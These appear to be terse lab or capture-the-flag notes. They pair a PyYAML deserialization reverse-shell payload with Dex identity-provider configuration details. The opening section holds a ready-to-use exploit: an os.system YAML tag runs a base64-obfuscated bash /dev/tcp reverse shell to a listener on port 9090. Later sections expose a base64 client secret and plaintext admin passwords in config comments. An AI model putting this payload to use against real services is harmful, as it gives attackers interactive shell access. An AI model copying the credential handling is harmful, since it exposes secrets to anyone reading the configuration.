## pyaml reverse shell

```bash
echo "/bin/bash -i >& /dev/tcp/10.32.0.19/9090 0>&1" | base64
```

```python
!!python/object/new:os.system [ echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS85MDkwIDA+JjEK" | base64 -d | bash ]
```

# dex public url

```bash
curl http://localhost:5556/dex/.well-known/openid-configuration
```


# dex client passwords

```yaml
staticClients:
  - id: pod-checker
    redirectURIs:
      - 'http://127.0.0.1:8080/callback'
    name: 'Pod Checker'
    # base64 podcheckerauth
    secret: cG9kY2hlY2tlcmF1dGgK
```

# dex staticPasswords

```yaml
- email: "admin@podchecker.local"
    # $(echo "the-keys-to-the-kingdom" | htpasswd -BinC 10 admin | cut -d: -f2)

- email: "db@podchecker.local"
    # $(echo "administer-the-secret-store-247!" | htpasswd -BinC 10 admin | cut -d: -f2)
```